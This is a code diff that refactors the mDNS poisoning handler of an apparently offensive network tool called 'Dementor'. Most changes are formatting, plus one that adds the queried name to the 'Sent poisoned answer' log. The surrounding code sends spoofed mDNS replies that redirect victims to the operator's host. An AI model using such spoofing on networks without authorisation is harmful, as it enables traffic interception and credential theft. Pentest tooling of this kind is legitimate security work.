@@ -55,16 +55,14 @@ def normalized_name(host: str | bytes) -> str:
 
 class MDNSConfig(TomlConfig):
     _section_ = "mDNS"
-    _fields_ = (
-        [
-            A("enabled", "Dementor.mDNS", True),
-            A("mdns_ttl", "TTL", 120),
-            A("mdns_max_labels", "MaxLabels", 1),
-            A("mdns_qtypes", "AllowedQueryTypes", [1, 28, 255]),  # A, AAAA, ANY
-            ATTR_WHITELIST,
-            ATTR_BLACKLIST
-        ]
-    )
+    _fields_ = [
+        A("enabled", "Dementor.mDNS", True),
+        A("mdns_ttl", "TTL", 120),
+        A("mdns_max_labels", "MaxLabels", 1),
+        A("mdns_qtypes", "AllowedQueryTypes", [1, 28, 255]),  # A, AAAA, ANY
+        ATTR_WHITELIST,
+        ATTR_BLACKLIST,
+    ]
 
     def set_mdns_qtypes(self, value: list):
         # REVISIT: maybe add error check here
@@ -115,7 +113,6 @@ class MDNSPoisoner(BaseProtoHandler):
         if normalized_qname.count(".") > self.config.mdns_config.mdns_max_labels:
             return False
 
-
         if question.qtype not in self.config.mdns_config.mdns_qtypes:  # A, AAAA, ANY
             return False
 
@@ -140,13 +137,12 @@ class MDNSPoisoner(BaseProtoHandler):
                 if self.should_answer_request(question):
                     name = markup.escape(normalized_name(qname))
                     self.logger.display(
-                        f"Request for [i]{name}[/i] (class: {qclass}, "
-                        f"type: {qtype})"
+                        f"Request for [i]{name}[/i] (class: {qclass}, type: {qtype})"
                     )
                     if self.config.analysis:
                         # Analyze-only mode
                         continue
-                    self.send_poisoned_answer(packet, question, transport)
+                    self.send_poisoned_answer(packet, question, transport, name)
                 # REVISIT: maybe log ignored requests
                 # else:
                 #     self.logger.display(
@@ -154,7 +150,9 @@ class MDNSPoisoner(BaseProtoHandler):
                 #         f"type: {qtype})"
                 #     )
 
-    def send_poisoned_answer(self, req, question: dns.DNSQR, transport) -> None:
+    def send_poisoned_answer(
+        self, req, question: dns.DNSQR, transport, name: str
+    ) -> None:
         # check if we can send a response
         if question.qtype == 28 and not self.config.ipv6:
             self.logger.highlight(
@@ -173,7 +171,9 @@ class MDNSPoisoner(BaseProtoHandler):
         # build response packet with our IP in answer RR
         response = build_dns_answer(req.id, question, self.config)
         transport.sendto(response.build(), self.client_address)
-        self.logger.success(f"Sent poisoned answer to {self.client_host}")
+        self.logger.success(
+            f"Sent poisoned answer to {self.client_host} for [i]{name}[/]"
+        )
 
 
 class MDNSServer(ThreadingUDPServer):
